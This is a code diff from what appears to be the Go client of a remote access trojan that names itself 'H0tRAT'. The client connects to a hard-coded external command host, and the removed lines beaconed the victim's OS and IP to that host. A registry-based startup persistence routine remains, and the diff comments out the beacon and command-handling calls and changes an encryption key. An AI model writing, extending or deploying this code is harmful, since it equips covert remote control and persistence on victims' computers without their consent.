@@ -11,8 +11,6 @@ import (
 	"net"
 	"os"
 	"path/filepath"
-	"runtime"
-	"strconv"
 	"sync"
 	"time"
 	"ylc/src/demo/util"
@@ -53,8 +51,9 @@ func heartbeat(conn net.Conn) {
 
 func connectNew() {
 	wg.Add(3) // 协程计数器 +1
-	go AddToStartup()
+	//go AddToStartup()
 	inetSocketAddress, _ := net.ResolveTCPAddr("tcp", "selectbyylc.e3.luyouxia.net:12863")
+	//fmt.Println(inetSocketAddress)
 	socket, err := net.DialTCP("tcp", nil, inetSocketAddress)
 	if err != nil {
 		fmt.Println(err)
@@ -62,26 +61,26 @@ func connectNew() {
 		return
 	}
 	defer socket.Close()
-	// IO流
-	dataOutputStream := bufio.NewWriter(socket)
-
-	// 发送信息
-	fmt.Fprintln(dataOutputStream, "H0tRAT")
-	fmt.Fprintln(dataOutputStream, "USER")
-	fmt.Fprintln(dataOutputStream, "HOSTNAME")
-	fmt.Fprintln(dataOutputStream, runtime.GOOS)
-	fmt.Fprintln(dataOutputStream, IP)
-	fmt.Fprintln(dataOutputStream, "测试地址")
-	fmt.Fprintln(dataOutputStream, "测试名字")
-	fmt.Fprintln(dataOutputStream, strconv.Itoa(1111))
-	fmt.Fprintln(dataOutputStream, "测试")
-	fmt.Fprintln(dataOutputStream, VERSION)
-	fmt.Fprintln(dataOutputStream, "360")
-
-	dataOutputStream.Flush()
+	//// IO流
+	//dataOutputStream := bufio.NewWriter(socket)
+	//
+	//// 发送信息
+	//fmt.Fprintln(dataOutputStream, "H0tRAT")
+	//fmt.Fprintln(dataOutputStream, "USER")
+	//fmt.Fprintln(dataOutputStream, "HOSTNAME")
+	//fmt.Fprintln(dataOutputStream, runtime.GOOS)
+	//fmt.Fprintln(dataOutputStream, IP)
+	//fmt.Fprintln(dataOutputStream, "测试地址")
+	//fmt.Fprintln(dataOutputStream, "测试名字")
+	//fmt.Fprintln(dataOutputStream, strconv.Itoa(1111))
+	//fmt.Fprintln(dataOutputStream, "测试")
+	//fmt.Fprintln(dataOutputStream, VERSION)
+	//fmt.Fprintln(dataOutputStream, "360")
+	//
+	//dataOutputStream.Flush()
 	// 协程计数器加-1
-	go doSomeThing(socket)
-	go heartbeat(socket)
+	//go doSomeThing(socket)
+	//go heartbeat(socket)
 
 	wg.Wait() //等待协程计数器为0 退出
 	fmt.Println("abc========================")
@@ -182,10 +181,10 @@ func AddToStartup() {
 		// 如果已存在，则不需要重复写入
 		return
 	}
-	encryptPath, err := util.EncryptString("ylcworld", exePath)
+	encryptPath, err := util.EncryptString("ylcworld19990709", exePath)
 
 	// 写入注册表项
-	decryptPath, err := util.DecryptString("ylcworld", encryptPath)
+	decryptPath, err := util.DecryptString("ylcworld19990709", encryptPath)
 	err = key.SetExpandStringValue(exeName, decryptPath)
 	if err != nil {
 		log.Fatal(err)
